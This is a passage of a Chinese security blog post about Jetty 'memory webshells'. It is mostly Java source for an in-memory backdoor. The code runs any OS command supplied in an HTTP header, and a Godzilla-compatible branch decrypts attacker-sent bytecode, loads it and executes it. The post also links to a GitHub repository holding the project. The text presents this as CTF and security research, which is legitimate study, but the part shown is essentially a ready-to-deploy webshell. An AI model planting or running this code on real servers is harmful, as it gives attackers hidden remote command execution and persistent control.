class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">customize</span><span class="params">(Connector connector, HttpConfiguration httpConfiguration, Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (request.getHeader(<span class="string">&quot;x-client-data&quot;</span>).equalsIgnoreCase(<span class="string">&quot;cmd&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                        String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\ASADSADASDSADAS&quot;</span>).next();</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">                        writer.println(result);</span><br><span class="line">                        writer.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (request.getHeader(<span class="string">&quot;x-client-data&quot;</span>).equalsIgnoreCase(<span class="string">&quot;godzilla&quot;</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题</span></span><br><span class="line">                        <span class="type">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">                        data = x(data, <span class="literal">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());</span><br><span class="line">                            <span class="type">Method</span> <span class="variable">defMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                            defMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            payload = (Class) defMethod.invoke(urlClassLoader, data, <span class="number">0</span>, data.length);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payload.newInstance();</span><br><span class="line">                            f.equals(arrOut);</span><br><span class="line">                            f.equals(data);</span><br><span class="line">                            f.equals(request);</span><br><span class="line">                            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">                            writer.write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">                            f.toString();</span><br><span class="line">                            writer.write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">                            writer.write(md5.substring(<span class="number">16</span>));</span><br><span class="line">                            writer.flush();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>该内存马类似于filter内存马，也就是tomcat的value内存马。</p>
<h1 id="有关代码"><a href="#有关代码" class="headerlink" title="有关代码"></a>有关代码</h1><p>有关代码已上传github<br><a target="_blank" rel="noopener" href="https://github.com/Boogipop/JettyMemshellProject">https://github.com/Boogipop/JettyMemshellProject</a></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Jetty/" class="tag">#Jetty</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/10/01/CVE-2023-38646%20Metabase%E6%9C%AA%E6%8E%88%E6%9D%83JDBC%20RCE/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">CVE-2023-38646 Metabase未授权JDBC RCE</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/10/01/Weblogic%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0&amp;&amp;%E9%9B%86%E6%88%90Suo5%E9%80%BB%E8%BE%91/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Weblogic内存马学习&amp;&amp;集成Suo5逻辑</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>